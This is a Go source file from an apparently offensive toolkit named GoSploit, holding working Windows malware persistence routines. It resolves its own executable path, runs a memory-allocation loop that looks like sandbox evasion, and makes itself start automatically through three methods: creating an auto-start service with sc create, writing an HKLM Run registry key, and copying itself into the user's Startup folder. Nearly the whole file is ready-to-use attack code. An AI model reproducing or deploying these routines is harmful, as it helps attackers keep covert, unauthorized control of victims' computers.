package GoSploit

import (
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/F-r-o-i-d/GoExF/GoExF/GoSploit/Regedit"
)

var (
	path    string = ""
	errPath error  = nil
)

func Initialize() string {

	path, errPath = filepath.Abs(os.Args[0])
	if errPath != nil {
		log.Fatal(errPath)
	}
	for i := 0; i < 10; i++ {
		var Size int = 30000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [102400000]byte
		Buffer_2[0] = 0
	}
	return path

}

// Create a service with the exe path
//
// /!\ need admin right
//
// New-Service -Name \"" + serviceName + "\" -BinaryPathName '" + path + "' -StartupType \"Automatic\"
func StartUpWservice(serviceName string) {
	exec.Command("cmd.exe", "/C", "sc create "+serviceName+" binPath= \"C:\\windows\\system32\\cmd.exe /k "+path+"\" type= own type= interact error= ignore start=Auto").Output()
}

//Create a regedit key to startup with exe path
//
// /!\ need admin right
//
//reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Name" /t REG_MULTI_SZ /d "path"
func StartUpWdregedit(keyName string) {
	key := Regedit.Key{
		Name:    keyName,
		Path:    "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		Value:   path,
		KeyType: Regedit.REG_SZ,
	}
	key.CreateKey()
}

func getUsername() string {
	name := os.Getenv("username")
	return name
}

func StartUpWdirectories() {
	CopyFile(path, "C:\\Users\\"+getUsername()+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+strings.Split(os.Args[0], "\\")[len(strings.Split(os.Args[0], "\\"))-1])
}

func CopyFile(src string, dest string) {
	bytesRead, err := ioutil.ReadFile(src)

	if err != nil {
		log.Fatal(err)
	}

	err = ioutil.WriteFile(dest, bytesRead, 0644)

	if err != nil {
		log.Fatal(err)
	}
}
